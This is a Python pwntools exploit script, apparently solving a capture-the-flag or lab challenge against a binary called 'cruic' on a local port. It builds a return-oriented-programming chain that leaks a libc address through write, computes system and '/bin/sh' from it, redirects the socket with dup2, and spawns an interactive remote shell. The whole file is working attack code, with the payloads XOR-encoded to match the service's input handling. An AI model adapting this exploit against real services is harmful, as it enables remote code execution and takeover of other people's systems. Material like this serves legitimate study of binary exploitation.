from pwn import *
import time

def XOR(input):
	output = ""
	for i in range(0,len(input)):
		if (i+1)%6 ==0 and i != 0:
			output += chr(input[i] ^ ord("\n"))
		else:
			output += chr(input[i] ^ ord("1"))
	return output

elf = context.binary = ELF('./cruic')
rop = ROP(elf)
libc = elf.libc
#Connect to remote
io = remote('127.0.0.1',4444)
#Gadgets
popRDI = int('401891',16) #pop rdi ; pop r9 ; pop rcx ; ret
popRSI_RDX = int('40186b',16) #pop rdx; pop rsi; ret
retAddr = int('40101a',16) #ret

#Functions
putsGOT = elf.got.sprintf
writePLT = elf.symbols.write
readData = elf.symbols.login
#Get connection number
currentConn = io.recvuntil(b'password:').decode('ascii')
print(currentConn)
currentConn = currentConn.split("\n")
currentConn = currentConn[0].split(" ")
currentConn = int(currentConn[4])

#Send Password
io.sendline(b'11111')

#Create Leak Payload
payload = b"".join(
	[
		b"A"*248,
		#pop rdx; pop rsi; ret
		p64(popRSI_RDX),
		p64(len(hex(putsGOT))),
		p64(putsGOT),
		#pop rdi; pop r9; pop rcx; ret
		p64(popRDI),
		p64(currentConn),
		p64(0x0),
		p64(0x0),
		#Call Write Function
		p64(writePLT),
		#Call Function Again
		p64(readData)
	]
)
#Send data length
data_length = str(len(payload))
print(data_length)
print(io.recvuntil(b'data len:').decode('ASCII'))
io.send(data_length)

#Send payload
print(io.recvuntil(b'data: '))
print(len(XOR(payload)))
io.send(XOR(payload))
io.recvuntil(b'\n')
print(io.recvline())
#Get leaked address
addressLine = io.recv(1000).split(b'your')
leakedAddr = u64(addressLine[0].strip().ljust(8,b"\x00"))

#Get connection again
newConnection = addressLine[1].split(b'\n')
newConnection = newConnection[0].split(b': ')
newConnection = int(newConnection[1])
#Set libc Address and get addresses
libc.address = leakedAddr - libc.symbols.sprintf
system = libc.symbols.system
binSH = next(libc.search(b'/bin/sh'))
dup2 = libc.symbols.dup2
#Create Payload
payloadExploit = b"".join(
	[
		#Offset
		b"A"*248,
		#Duplicated FD
		#NewFD -> rdi OldFD -> rsi
		#STDIN
		#pop rdi; pop r9; pop rcx; ret
		p64(popRDI),
		p64(newConnection),
		p64(0x0),
		p64(0x0),
		#pop rdx; pop rsi; ret
		p64(popRSI_RDX),
		p64(0x0),
		p64(0x0),
		p64(dup2),
		#STDOUT
		#pop rdi; pop r9; pop rcx; ret
		p64(popRDI),
		p64(newConnection),
		p64(0x0),
		p64(0x0),
		#pop rdx; pop rsi; ret
		p64(popRSI_RDX),
		p64(0x0),
		p64(0x1),
		p64(dup2),
		#STDERR
		#/bin/sh to rdi
		#pop rdi; pop r9; pop rcx; ret
		p64(popRDI),
		p64(binSH),
		p64(0x0),
		p64(0x0),
		#call system
		p64(system),
		p64(0x0)
	]
)
#Send Password in
io.sendline(b'11111')
io.recvuntil(b'data len:')
#Send Length
io.sendline(str(len(payloadExploit)))
io.recvuntil(b'data: ')
#Send Payload
io.send(XOR(payloadExploit))
io.interactive()
